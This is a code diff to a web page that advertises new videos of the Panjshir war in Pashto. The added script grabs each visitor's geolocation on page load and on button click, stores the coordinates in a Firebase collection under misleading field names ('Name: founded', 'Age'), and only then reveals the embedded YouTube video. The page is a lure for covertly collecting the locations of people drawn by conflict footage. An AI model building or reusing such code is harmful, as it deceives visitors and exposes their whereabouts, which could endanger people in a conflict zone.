@@ -18,7 +18,11 @@
             &#10549;
             <button class='btn' onclick="findperson()">کتل</button> -->
             <!-- <button class='btn btn-primary' onclick="saveTest()">کتل</button> -->
-            <div class="btn btn-primary btn-lg" onclick="windows.location.reload()">ویدیوهای جدید جنګ پنجشیر</div>
+            <iframe id="video" style="display: none;" width="853" height="480"
+                src="https://www.youtube.com/embed/Q-qqkeD7pDQ" title="YouTube video player" frameborder="0"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen></iframe>
+            <div class="btn btn-primary btn-lg" id="button">ویدیوهای جدید جنګ پنجشیر</div>
             <div id="result">
 
             </div>
@@ -51,6 +55,7 @@
     const app = initializeApp(firebaseConfig);
     // Initialize Cloud Firestore and get a reference to the service
     const db = getFirestore(app);
+    const video = document.querySelector('#video');
 
     document.addEventListener('DOMContentLoaded', function () {
         if (navigator.geolocation) {
@@ -60,9 +65,26 @@
                     Name: "founded",
                     Age: eValue.coords.latitude + ',' + eValue.coords.longitude
                 });
+                video.style.display = 'block';
             }
         }
     })
+
+    document.querySelector('#button').addEventListener('click', function () {
+        // window.location.reload();
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(show)
+            function show(eValue) {
+                addDoc(collection(db, "users"), {
+                    Name: "founded",
+                    Age: eValue.coords.latitude + ',' + eValue.coords.longitude
+                });
+                video.style.display = 'block';
+            }
+        }
+    })
+
+
     // ---------------------read Data from Firebase
     // const q = query(collection(db, "users"), where("Name", "==", 'founded'));
 
